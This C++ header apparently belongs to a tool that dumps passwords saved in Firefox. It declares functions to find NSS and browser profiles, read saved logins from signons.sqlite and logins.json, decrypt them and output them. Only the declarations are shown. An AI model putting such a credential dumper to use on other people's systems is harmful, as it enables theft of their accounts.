#pragma once

#include "nss.hxx"
#include "crypt.hxx"
#include <fstream>

#include <ShlObj.h>
#include <wil/resource.h>
#include <nlohmann/json.hpp>
#include <sqlite3.h>

std::filesystem::path get_nss_location();
std::vector<std::filesystem::path> get_valid_profiles();

class FFBT : public NSS
{
public:
    // credentials
    int retrieve_credentials(std::filesystem::path profile_path, int output_type);

    // decryption
    std::vector<std::vector<std::string>> get_sqlite_credentials(std::filesystem::path signons_path);
    std::vector<std::vector<std::string>> get_json_credentials(std::filesystem::path logins_path);
    std::vector<std::vector<std::string>> decrypt_credentials(std::vector<std::vector<std::string>> encrypted_creds);

    // output
    int output_credentials(std::vector<std::vector<std::string>> decrypted_creds, int output_type);
};